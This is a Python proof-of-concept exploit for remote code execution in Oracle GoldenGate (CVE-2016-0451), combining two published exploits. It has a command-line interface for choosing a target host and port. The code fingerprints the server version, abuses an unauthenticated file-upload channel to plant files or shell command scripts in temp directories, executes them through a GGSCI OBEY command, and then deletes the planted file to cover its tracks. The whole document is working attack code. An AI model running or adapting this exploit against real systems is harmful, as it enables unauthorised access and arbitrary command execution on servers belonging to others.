import sys
import struct
import socket
import time
import argparse
import os
import binascii
import base64

# #################################################
# GoldenGate RCE
# Combination of the following two exploits:
# --> https://www.exploit-db.com/exploits/41978/
# --> https://redr2e.com/cve-to-poc-cve-2016-0451/
#
# Author: b0yd (@rwincey Securifera)
#
##################################################

def send_receive(host, port, data):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    s.send(data)

    data = None
    try:
        data = s.recv(1024)
    except Exception as e:
        print(e)
        pass
        
    s.close()

    return data
    
    
def send_exec():

    cmd = "GGSCI START OBEY " + file_name
    cmd=cmd.replace(" ", "\x09")
    length = struct.pack(">H", len(cmd))
    data = length + cmd.encode()

    # Send and receive
    ret = send_receive(host, port, data)
    
def version():

    cmd="GGSCI\tVERSION"
    length=struct.pack(">H", len(cmd))
    data = length + cmd.encode()
    ret_data = send_receive(host,port,data)
    if ret_data:
        ret_data = ret_data.decode()
        ret_data = ret_data[2:].replace("\t"," ")
        
    return ret_data
            
def file_upload(file_name, fileContent):    

    file_length = len(fileContent)
    if file_length > 65535:
        print("[-] Error: File too big. Max size is 65535 bytes")
        return
    
    cmd_str = 'EXTRACT START SERVER CPU -1 PRI -1 TIMEOUT 300 PARAMS'
    cmd = cmd_str.replace(" ","\x09").encode()    
    data = struct.pack(">H", len(cmd_str))
    data += cmd    

    # Send and receive
    ret = send_receive(host, port, data)
    if ret:
        d = ret.decode()
        idx = d.index('port')
        upload_port = int(d[idx + 4:-1].strip())
        print("[*] Upload port: %d" % upload_port)
    
        # The structure of the packet (big endian format):
        # [packet size]		 	(hex, 2 bytes)
        # ["H"] 				(ascii) Unknown meaning of H, could be a particular directive
        # [NULL byte]
        # [dest path size] 		(hex, 1 byte)
        # [dest path] 			(ascii)
        # [2x NULL bytes]
        # [source file size]	(hex, 4 bytes)
        # [NULL byte]
        # [source file contents] 
        
        fileContentSize = struct.pack('>I', file_length)
        
        pathSz = chr(len(file_name))
        payload = "H\x00".encode()    
        payload += pathSz.encode()
        payload += file_name.encode()
        payload += "\x00\x00".encode()
        payload += fileContentSize
        payload += "\x00".encode()
        payload += fileContent
        
        # Append length
        ret_bytes = struct.pack(">H", len(payload))
        ret_bytes += payload  
            
        ret = send_receive(host, upload_port, ret_bytes)
        print("[*] File sent")
        
if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Oracle GoldenGate RCE - CVE-2016-0451')
    parser.add_argument("-i", help="Target host", required=True)
    parser.add_argument("-p", help="Target port", type=int, required=True)
    parser.add_argument("-f", help="File to upload")
    parser.add_argument("-d", help="Dest path for file upload")
    parser.add_argument("-c", help="Command(s)")
    parser.add_argument("--version", help="Get target version", action="store_true")
    args = parser.parse_args()
	
    host = args.i
    port = args.p
    
    # version info
    ret_version = version()
    if ret_version:
        osys = "win"
        if "Windows" not in ret_version:
            osys = "nix"
            
        if args.version:
            print(ret_version)

        # Upload a file
        if args.f and args.d:
        
            f = open(args.f, 'rb')
            file_data = f.read()
            f.close()
            
            dest_path = args.d
            
            # Send file upload
            file_upload(dest_path, file_data)
            
        if args.c:
        
            cmd = args.c       
            # Create random file in Windows temp
            file_name = "w" + binascii.hexlify(os.urandom(4)).decode()
                        
            if osys == "nix":
                file_path = "/tmp/"
                file_path += file_name
                cmd += ' ; rm %s"' % (file_path )
            else:
                file_path = 'C:\\Windows\\Temp\\'
                file_path += file_name
                cmd += ' & wmic process call create "cmd.exe /c timeout 10 & del %s"' % (file_path )
                
            # Send file upload            
            file_content = "SHELL " + cmd
            file_upload(file_path, file_content.encode())
            
            # Wait for the server process to timeout
            time.sleep(20)	

            # Attempt to execute file
            send_exec()

            print("[*] Exploit Complete")
            
    else:
        print("[-] Unable to connect to GoldenGate server")
        
        
